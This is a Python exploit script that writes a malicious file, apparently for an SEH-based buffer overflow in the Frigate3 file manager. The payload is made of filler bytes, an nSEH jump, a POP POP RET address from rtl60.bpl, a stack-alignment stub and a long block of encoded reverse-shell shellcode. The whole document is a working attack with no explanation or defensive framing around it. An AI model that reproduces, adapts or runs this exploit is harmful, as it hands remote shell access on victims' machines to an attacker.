#!/usr/bin/python

import struct

filename = 'test.txt'

revshell =  b""
revshell += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
revshell += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
revshell += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
revshell += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
revshell += b"\x42\x75\x4a\x49\x69\x6c\x4d\x38\x4d\x52\x77\x70"
revshell += b"\x65\x50\x57\x70\x61\x70\x4c\x49\x69\x75\x50\x31"
revshell += b"\x6b\x70\x43\x54\x6e\x6b\x50\x50\x44\x70\x4c\x4b"
revshell += b"\x73\x62\x54\x4c\x4c\x4b\x31\x42\x56\x74\x6e\x6b"
revshell += b"\x70\x72\x56\x48\x76\x6f\x4e\x57\x33\x7a\x75\x76"
revshell += b"\x50\x31\x49\x6f\x6e\x4c\x37\x4c\x31\x71\x53\x4c"
revshell += b"\x34\x42\x64\x6c\x75\x70\x6b\x71\x48\x4f\x64\x4d"
revshell += b"\x46\x61\x79\x57\x6b\x52\x49\x62\x56\x32\x76\x37"
revshell += b"\x6e\x6b\x66\x32\x42\x30\x4c\x4b\x70\x4a\x47\x4c"
revshell += b"\x4c\x4b\x30\x4c\x32\x31\x31\x68\x6d\x33\x63\x78"
revshell += b"\x33\x31\x6a\x71\x32\x71\x4e\x6b\x43\x69\x45\x70"
revshell += b"\x55\x51\x4a\x73\x6e\x6b\x77\x39\x72\x38\x48\x63"
revshell += b"\x44\x7a\x52\x69\x4c\x4b\x57\x44\x6c\x4b\x67\x71"
revshell += b"\x69\x46\x50\x31\x39\x6f\x6e\x4c\x6f\x31\x7a\x6f"
revshell += b"\x54\x4d\x67\x71\x38\x47\x47\x48\x59\x70\x43\x45"
revshell += b"\x4b\x46\x65\x53\x73\x4d\x5a\x58\x37\x4b\x43\x4d"
revshell += b"\x56\x44\x50\x75\x58\x64\x61\x48\x4e\x6b\x62\x78"
revshell += b"\x46\x44\x36\x61\x6b\x63\x51\x76\x4c\x4b\x34\x4c"
revshell += b"\x30\x4b\x6c\x4b\x50\x58\x37\x6c\x47\x71\x59\x43"
revshell += b"\x6c\x4b\x53\x34\x6c\x4b\x33\x31\x58\x50\x6c\x49"
revshell += b"\x53\x74\x51\x34\x51\x34\x33\x6b\x73\x6b\x63\x51"
revshell += b"\x56\x39\x53\x6a\x53\x61\x49\x6f\x39\x70\x51\x4f"
revshell += b"\x61\x4f\x51\x4a\x4c\x4b\x66\x72\x48\x6b\x4e\x6d"
revshell += b"\x73\x6d\x61\x78\x65\x63\x45\x62\x43\x30\x63\x30"
revshell += b"\x33\x58\x70\x77\x71\x63\x77\x42\x63\x6f\x56\x34"
revshell += b"\x30\x68\x70\x4c\x54\x37\x56\x46\x44\x47\x39\x6f"
revshell += b"\x38\x55\x4c\x78\x6c\x50\x66\x61\x67\x70\x63\x30"
revshell += b"\x55\x79\x69\x54\x70\x54\x70\x50\x32\x48\x65\x79"
revshell += b"\x6b\x30\x52\x4b\x75\x50\x6b\x4f\x58\x55\x42\x70"
revshell += b"\x36\x30\x46\x30\x56\x30\x57\x30\x70\x50\x63\x70"
revshell += b"\x56\x30\x71\x78\x38\x6a\x44\x4f\x6b\x6f\x4b\x50"
revshell += b"\x6b\x4f\x69\x45\x4e\x77\x52\x4a\x37\x75\x33\x58"
revshell += b"\x79\x50\x49\x38\x63\x54\x30\x75\x72\x48\x37\x72"
revshell += b"\x65\x50\x56\x71\x33\x6c\x6b\x39\x58\x66\x61\x7a"
revshell += b"\x72\x30\x46\x36\x46\x37\x51\x78\x6e\x79\x4f\x55"
revshell += b"\x51\x64\x61\x71\x59\x6f\x49\x45\x6e\x65\x49\x50"
revshell += b"\x71\x64\x64\x4c\x79\x6f\x32\x6e\x66\x68\x63\x45"
revshell += b"\x38\x6c\x31\x78\x38\x70\x58\x35\x39\x32\x76\x36"
revshell += b"\x69\x6f\x6b\x65\x73\x58\x71\x73\x72\x4d\x53\x54"
revshell += b"\x65\x50\x4c\x49\x5a\x43\x30\x57\x50\x57\x61\x47"
revshell += b"\x66\x51\x79\x66\x73\x5a\x76\x72\x72\x79\x52\x76"
revshell += b"\x6b\x52\x4b\x4d\x32\x46\x68\x47\x50\x44\x35\x74"
revshell += b"\x77\x4c\x75\x51\x73\x31\x6e\x6d\x47\x34\x75\x74"
revshell += b"\x74\x50\x68\x46\x67\x70\x51\x54\x56\x34\x36\x30"
revshell += b"\x33\x66\x51\x46\x30\x56\x51\x56\x36\x36\x52\x6e"
revshell += b"\x36\x36\x50\x56\x56\x33\x36\x36\x53\x58\x63\x49"
revshell += b"\x6a\x6c\x77\x4f\x6f\x76\x59\x6f\x68\x55\x4b\x39"
revshell += b"\x6d\x30\x32\x6e\x53\x66\x33\x76\x69\x6f\x50\x30"
revshell += b"\x45\x38\x53\x38\x4e\x67\x45\x4d\x75\x30\x6b\x4f"
revshell += b"\x59\x45\x6d\x6b\x48\x70\x6f\x45\x79\x32\x66\x36"
revshell += b"\x30\x68\x6e\x46\x6e\x75\x6f\x4d\x4f\x6d\x6b\x4f"
revshell += b"\x7a\x75\x77\x4c\x63\x36\x51\x6c\x34\x4a\x4f\x70"
revshell += b"\x49\x6b\x49\x70\x54\x35\x45\x55\x4f\x4b\x62\x67"
revshell += b"\x56\x73\x62\x52\x30\x6f\x31\x7a\x33\x30\x71\x43"
revshell += b"\x69\x6f\x39\x45\x41\x41"


alignESP = "\x54\x58\x66\x05\xCF\x0B\x66\x05\xC5\x09\x50\x5C\xFF\xE4"

nSeh = "\x74\x1A\x75\x1A" # NetJumping
Seh = "\x5f\x07\x01\x40"  # 0x4001075f : pop ecx # pop ebp # ret 0x04  - C:\Program Files\Frigate3\rtl60.bpl

payload  = "A" * 4112
payload += nSeh
payload += Seh
payload += "C" * 16
payload += "A" * 4 # start of Null bytes
payload += alignESP
payload += "\x90" * 2
payload += revshell
payload += "\x90" * (7000 - len(payload))


print "[+] Creating file %s" % filename
with open(filename, 'w') as f:
    f.write(payload)
print "    File created, wrote %d bytes to file" % len(payload)

